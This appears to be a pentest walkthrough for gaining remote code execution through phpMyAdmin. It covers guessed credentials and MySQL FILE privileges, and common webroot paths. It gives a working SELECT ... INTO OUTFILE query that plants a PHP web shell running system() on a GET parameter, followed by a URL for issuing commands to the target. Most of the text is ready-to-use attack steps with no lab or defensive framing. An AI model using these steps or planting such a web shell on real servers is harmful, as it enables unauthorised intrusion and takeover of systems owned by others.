#### **Prerequisites**

- Access to the phpMyAdmin interface with valid credentials (via credential guessing or other methods).
- `FILE` privileges granted to the MySQL user account.
- The webroot location of the target server must be known and writable by MySQL.

#### **Steps to Achieve RCE**

1. **Confirm File Privileges** Run the following query to check if the MySQL user has `FILE` privileges:
    
    ```sql
    SHOW GRANTS FOR CURRENT_USER;
    ```
![image](https://github.com/user-attachments/assets/19dd848f-e020-4aee-b76b-d052fdce2562)

    Look for `FILE` privilege in the output.
    
2. **Determine the Webroot Location**
    
    - Use phpinfo() if accessible via the web server to identify the document root.
    - ![Screenshot 2025-02-28 223302](https://github.com/user-attachments/assets/c63a7679-dfc2-4a98-805f-5955791138c3)
    - Typical webroots:
        - LAMP: `/var/www/html`
        - WAMP/XAMPP: `C:/wamp/www` or `C:/xampp/htdocs`
3. **Create the Webshell** Use the `OUTFILE` function to write a webshell:
    
    ```sql
    SELECT '<?php system($_GET["cmd"]); ?>;' INTO OUTFILE '/path/to/webroot/shell.php';
    ```
    
    Replace `/path/to/webroot/` with the identified webroot (e.g., `C:/wamp/www/`).
    
4. **Access the Webshell** Navigate to the shell via a browser:
    
    ```
    http://<target-ip>/shell.php?cmd=whoami
    ```
    Replace `cmd` with your desired command.
    

---

